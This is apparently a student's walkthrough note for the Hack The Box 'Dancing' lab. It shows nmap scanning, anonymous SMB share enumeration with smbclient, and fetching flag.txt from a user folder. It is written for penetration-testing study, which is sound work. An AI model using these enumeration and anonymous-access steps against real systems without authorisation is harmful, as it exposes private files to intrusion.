## Box: [Dancing] — Started: 2025-10-05 21:10

**IP/Host:** `HTB Attackbox`  |  **Status:** `Owned: 25-10-05`

### TL;DR

Initial: `smbclient \\\\IPADDR\\WorkShares`. Flag Cap: `smb: \James.P\> get flag.txt`

*Cumulative Impact Overview*:
- SMB Learning Lab

### Exploit Lifecycle

1. *Validation & Recon*: HTB CTF
2. *Enumeration & Scanning*:
    - `nmap -sV IPADDR` - Found SMB service up (port pair 139/445)
3. *Findings & Exploits*:
    - `smbclient --list=IPADDR` - lists available workshares, which were:
    - ```powershell
  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
  WorkShares      Disk      
```
    - `smbclient \\\\IPADDR\\WorkShares` - connected
    - `smb: \James.P\> ls` - listed directories:
    - ```powershell
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

  5114111 blocks of size 4096. 1733613 blocks available
      ```
    - Amy.J only held worknotes.txt, James.P had the flag:
4. *PrivEsc*: N/A
5. *Post-Exploitation*:
    - Amy.J only held worknotes.txt, James.P had the flag:
    - ```powershell
  smb: \> cd James.P
  smb: \James.P\> ls
    .                                   D        0  Thu Jun  3 03:38:03 2021
    ..                                  D        0  Thu Jun  3 03:38:03 2021
    flag.txt                            A       32  Mon Mar 29 04:26:57 2021
    
    5114111 blocks of size 4096. 1733557 blocks available
  smb: \James.P\> get flag.txt 
  getting file \James.P\flag.txt of size 32 as flag.txt (0.6 KiloBytes/sec) (average 1.2 KiloBytes/sec)
  smb: \James.P\> exit

  ``` 

*Proof — path to flags/screenshot of boxpwn*:

![[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practice/Starting Point/z_attachments/Pasted image 20251005212613.png]]


### Commands Learned or Commands Used
```bash
smbclient --list=IPADDR           # list available shares if anon access is allowed or auth is possible
smbclient \\\\IPADDR\\SHARENAME   # Connect, anon if blank password is entered
```

